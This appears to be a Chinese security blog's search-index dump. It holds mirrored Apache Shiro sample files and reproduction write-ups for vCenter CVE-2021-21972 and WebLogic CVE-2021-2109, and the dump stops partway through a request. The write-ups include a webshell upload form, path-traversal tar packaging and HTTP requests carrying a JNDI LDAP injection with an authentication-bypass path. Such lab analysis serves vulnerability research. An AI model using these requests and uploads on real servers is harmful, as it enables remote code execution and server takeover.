权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/hello/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/hello/","excerpt":"","text":"Login Account info&nbsp;(Requires 'admin' role.) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/fragments/head","date":"2021-03-03T08:20:18.442Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/fragments/head/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/fragments/head/","excerpt":"","text":"Nothing to see here, move along. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/error","date":"2021-03-03T08:20:18.441Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/error/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/error/","excerpt":"","text":"Unauthorized Go Home document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/account-info","date":"2021-03-03T08:20:18.439Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/account-info/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/account-info/","excerpt":"","text":"Home document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/README","date":"2021-03-03T08:20:18.429Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/README/","excerpt":"","text":"Apache Shiro + Spring Web Example A Spring Boot example web application that show the usage of a user login, checking permissions, and annotation protected methods. Run the Example 1mvn spring-boot:run Browse to http://localhost:8080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/servlet-plugin/src/main/webapp/style","date":"2021-03-03T08:20:18.423Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/servlet-plugin/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/servlet-plugin/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/guice/src/main/webapp/style","date":"2021-03-03T08:20:18.379Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/guice/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/guice/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/guice/README","date":"2021-03-03T08:20:18.363Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/guice/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/guice/README/","excerpt":"","text":"Apache Shiro + Guice Example A Guice example web application that show how to configure Shiro via Guice, and basic user login. Run the Example 1mvn jetty:run Browse to http://localhost:9080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/integration-tests/guice4/src/main/webapp/style","date":"2021-03-03T08:20:18.296Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/integration-tests/guice4/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/integration-tests/guice4/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/integration-tests/guice3/src/main/webapp/style","date":"2021-03-03T08:20:18.278Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/integration-tests/guice3/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/integration-tests/guice3/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/CONTRIBUTING","date":"2021-03-03T08:20:17.790Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/CONTRIBUTING/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/CONTRIBUTING/","excerpt":"","text":"Contributing to Apache Shiro Summary This document covers how to contribute to the Apache Shiro project. These instructions assume you have a GitHub.com account, so if you don’t have one you will have to create one. Your proposed code changes will be published to your own fork of the Apache Shiro project and you will submit a Pull Request for your changes to be added. Lets get started!!! Fork the code In your browser, navigate to: https://github.com/apache/shiro Fork the repository by clicking on the ‘Fork’ button on the top right hand side. The fork will happen and you will be taken to your own fork of the repository. Copy the Git repository URL by clicking on the clipboard next to the URL on the right hand side of the page under ‘HTTPS clone URL’. You will paste this URL when doing the following git clone command. On your computer, follow these steps to setup a local repository for working on Apache Shiro: 123456$ git clone https://github.com/YOUR_ACCOUNT/shiro.git$ cd shiro$ git remote add upstream https://github.com/apache/shiro.git$ git checkout master$ git fetch upstream$ git rebase upstream/master Making changes It is important that you create a new branch to make changes on and that you do not change the master branch (other than to rebase in changes from upstream/master). In this example I will assume you will be making your changes to a branch called feature_x. This feature_x branch will be created on your local repository and will be pushed to your forked repository on GitHub. Once this branch is on your fork you will create a Pull Request for the changes to be added to the Apache Shiro project. It is best practice to create a new branch each time you want to contribute to the project and only track the changes for that pull request in this branch. 12345$ git checkout -b feature_x (make your changes)$ git status$ git add .$ git commit -a -m \"descriptive commit message for your changes\" The -b specifies that you want to create a new branch called feature_x. You only specify -b the first time you checkout because you are creating a new branch. Once the feature_x branch exists, you can later switch to it with only git checkout feature_x. Rebase feature_x to include updates from upstream/master It is important that you maintain an up-to-date master branch in your local repository. This is done by rebasing in the code changes from upstream/master (the official Apache Shiro project repository) into your local repository. You will want to do this before you start working on a feature as well as right before you submit your changes as a pull request. I recommend you do this process periodically while you work to make sure you are working off the most recent project code. This process will do the following: Checkout your local master branch Synchronize your local master branch with the upstream/master so you have all the latest changes from the project Rebase the latest project code into your feature_x branch so it is up-to-date with the upstream code 12345$ git checkout master$ git fetch upstream$ git rebase upstream/master$ git checkout feature_x$ git rebase master Now your feature_x branch is up-to-date with all the code in upstream/master. Make a GitHub Pull Request to contribute your changes When you are happy with your changes and you are ready to contribute them, you will create a Pull Request on GitHub to do so. This is done by pushing your local changes to your forked repository (default remote name is origin) and then initiating a pull request on GitHub. IMPORTANT: Make sure you have rebased your feature_x branch to include the latest code from upstream/master before you do this. 12$ git push origin master$ git push origin feature_x Now that the feature_x branch has been pushed to your GitHub repository, you can initiate the pull request. To initiate the pull request, do the following: In your browser, navigate to your forked repository: https://github.com/YOUR_ACCOUNT/shiro Click the new button called ‘Compare &amp; pull request’ that showed up just above the main area in your forked repository Validate the pull request will be into the upstream master and will be from your feature_x branch Enter a detailed description of the work you have done and then click ‘Send pull request’ If you are requested to make modifications to your proposed changes, make the changes locally on your feature_x branch, re-push the feature_x branch to your fork. The existing pull request should automatically pick up the change and update accordingly. Cleaning up after a successful pull request Once the feature_x branch has been committed into the upstream/master branch, your local feature_x branch and the origin/feature_x branch are no longer needed. If you want to make additional changes, restart the process with a new branch. IMPORTANT: Make sure that your changes are in upstream/master before you delete your feature_x and origin/feature_x branches! You can delete these deprecated branches with the following: 123$ git checkout master$ git branch -D feature_x$ git push origin :feature_x document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/Apache Shiro 权限绕过漏洞(CVE-2020-17523)","date":"2021-03-03T08:14:47.000Z","updated":"2021-03-04T06:13:27.858Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/","excerpt":"","text":"漏洞简介 漏洞复现 漏洞分析 对比 1.7.0 版本和 1.7.1 版本的 shiro ,发现新增测试用例 PathMatchingFilterParameterizedTest.java 里面提供了一些权限绕过的 payload shiro-shiro-root-1.7.1\\web\\src\\test\\java\\org\\apache\\shiro\\web\\filter\\PathMatchingFilterParameterizedTest.java 参考文章 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"CVE-2021-21972 Vmware vcenter未授权任意文件上传","slug":"CVE-2021-21972 Vmware vcenter未授权任意文件上传","date":"2021-03-03T06:07:20.000Z","updated":"2021-03-09T15:57:27.159Z","comments":true,"path":"2021/03/03/CVE-2021-21972 Vmware vcenter未授权任意文件上传/","link":"","permalink":"http://yoursite.com/2021/03/03/CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"漏洞简介 vSphere 是 VMware 推出的虚拟化平台套件，包含 ESXi、vCenter Server 等一系列的软件。其中 vCenter Server 为 ESXi 的控制中心，可从单一控制点统一管理数据中心的所有 vSphere 主机和虚拟机，使得 IT 管理员能够提高控制能力，简化入场任务，并降低 IT 环境的管理复杂性与成本。 vSphere Client（HTML5）在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，从而在服务器上写入 webshell，最终造成远程任意代码执行。","text":"漏洞简介 vSphere 是 VMware 推出的虚拟化平台套件，包含 ESXi、vCenter Server 等一系列的软件。其中 vCenter Server 为 ESXi 的控制中心，可从单一控制点统一管理数据中心的所有 vSphere 主机和虚拟机，使得 IT 管理员能够提高控制能力，简化入场任务，并降低 IT 环境的管理复杂性与成本。 vSphere Client（HTML5）在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，从而在服务器上写入 webshell，最终造成远程任意代码执行。 影响版本 vmware:vcenter_server 7.0 U1c 之前的 7.0 版本 vmware:vcenter_server 6.7 U3l 之前的 6.7 版本 vmware:vcenter_server 6.5 U3n 之前的 6.5 版本 环境搭建 链接：https://pan.baidu.com/s/1RPCJCVdNnBmB3KGMXjTnIg 提取码：7nmo 复制这段内容后打开百度网盘手机App，操作更方便哦 看了网上的很多分析文章，照着其操作，安装成功之后，去访问应该存在漏洞的位置，却总是返回401信息。感谢@null师傅，给我分享 VMware-VIM-all-6.7.0-14836122，在我复现分析的时候提供了超大的帮助。 漏洞复现 首先通过访问路径 https://192.168.198.131/ui/vropspluginui/rest/services/uploadova 判断当前的 vCenter Server 是否存在漏洞 返回信息为 405，请求方法有误，证实存在这个上传的接口，通过构造上传表单 12345&lt;form id=\"exp\" method=\"post\" enctype=\"multipart/form-data\"&gt;&lt;p&gt;target url &gt; &lt;input id=\"url\" type=\"text\" style=\"width: 300px\"&gt;&lt;/p&gt;&lt;p&gt;shell file &gt; &lt;input type=\"file\" name=\"uploadFile\"&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=\"submit\" value=\"Submit\" onclick=\"exp.action=url.value\"&gt;&lt;/p&gt;&lt;/form&gt; 利用 python 脚本 https://github.com/ptoomey3/evilarc/blob/master/evilarc.py 构造恶意 tar 包 目前已经可以实现任意文件的上传，为了能直接拿到 shell 所以我们还需要找一个前端页面能显示出的位置，将 shell 上传到那。 os：因为我并不清楚应该将 shell 上传到某个位置才能在前端页面显示出来，于是我想着在所有的文件夹之下都生成一个 1.txt，这个 1.txt 里面存储着当前对应的路径位置，然后在前端进行扫描，查看 1.txt 的信息，就可以快速定位要上传的位置。 1234567891011121314import osfor root,dirs,files in os.walk(r\"C:\\ProgramData\"): for dir in dirs: #获取目录的名称 print(dir) #获取目录的路径 print(os.path.join(root,dir)) filename =os.path.join(root,dir)+'\\\\1.txt' try: with open(filename, 'w') as file_object: file_object.write(os.path.join(root,dir)) except: pass continue C:\\ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport https://192.168.198.131/vsphere-client/1.txt C:\\ProgramData\\VMware\\vCenterServer\\runtime\\vsphere-client\\server\\work\\deployer\\s\\global\\29\\0\\container-app-war.war https://192.168.198.131/statsreport/1.txt 我们得到了路径之后再利用脚本生成https://github.com/ptoomey3/evilarc/blob/master/evilarc.py 恶意 tar 包 上传 tar 包，发现木马已经被解压到相对应的位置 利用冰蝎连接木马 漏洞分析 根据漏洞描述 vCenter Server 的 vROPS 插件的 API 未经过鉴权，存在一些敏感接口 直接在C盘目录下进行搜索 vrops C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vsphere-ui\\vc-packages\\vsphere-client-serenity\\com.vmware.vrops.install-6.7.0.41000\\plugins\\vropsplugin-service.jar 在这个文件中，我们能够看到网上所提及到的上传接口路由 /uploadova com.vmware.vropspluginui.mvc.ServicesController#uploadOvaFile 上传之后会将传入的文件解压，并将文件名拼接到 /tmp/unicorn_ova_di 然后创建文件。通过在文件名中添加 ../../ 就可以实现跨目录的上传 参考文章 Unauthorized RCE in VMware vCenter CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞分析 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"weblogic CVE-2021-2109","slug":"weblogic CVE-2021-2109","date":"2021-01-24T08:48:09.000Z","updated":"2021-03-09T15:57:27.162Z","comments":true,"path":"2021/01/24/weblogic CVE-2021-2109/","link":"","permalink":"http://yoursite.com/2021/01/24/weblogic%20CVE-2021-2109/","excerpt":"漏洞简介 Oracle官方发布了漏洞补丁，修了包括 CVE-2021-2109 Weblogic Server远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。","text":"漏洞简介 Oracle官方发布了漏洞补丁，修了包括 CVE-2021-2109 Weblogic Server远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。 影响版本 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 WebLogic 14.1.1.0.0 漏洞复现 选用 jdk-8u181 weblogic 12.1.4.0 搭建漏洞环境，因为是通过 JNDI 注入进行的远程命令执行，所以会受到 JDK 版本的影响。JNDI 注入的 JDK 版本如图所示 下载 weblogic 安装包后，以管理员身份打开 cmd 控制台，执行 java -jar fmw_12.2.1.4.0_wls_lite_generic.jar 一路 next 就好。 安装完成之后，启动 C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\startWebLogic.cmd 就可以启动 weblogic。 设置调试的话修改 user_project/domains/bin目录中 setDomainEnv.cmd 或者 setDomainEnv.sh 文件，在 if \"%debugFlag%\"==\"true\" 前加入 set debugFlag=true 在同一文件中 通过 set DEBUG_PORT=8453 指定了远程调试的端口，拷贝 Oracle_Home 目录下所有文件至调试目录，配置 Remote 方式进行远程调试，端口为 8453 利用 JNDI 注入工具 https://github.com/welk1n/JNDI-Injection-Exploit 生成payload 登录 weblogic 控制台，发送数据包 1234567891011121314POST /console/consolejndi.portal HTTP/1.1Host: 192.168.176.167:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8Referer: http://192.168.176.167:7001/console/css/%252e%252e%252f/consolejndi.portalAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedCookie: ADMINCONSOLESESSION=Dxo4Mj2wREQ8hHIy7WpBfolb35JVathlBeQhVN6hjuJCRzKBUGDi!-1446449740Connection: closeContent-Length: 163_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.176;1:1389/pq2ld0;AdminServer%22) 可以结合 CVE-2020-14882 权限绕过漏洞，删除cookie，重新构造数据包 12345678910111213POST /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1Host: 192.168.176.167:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8Referer: http://192.168.176.167:7001/console/css/%252e%252e%252f/consolejndi.portalAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedConnection: closeContent-Length: 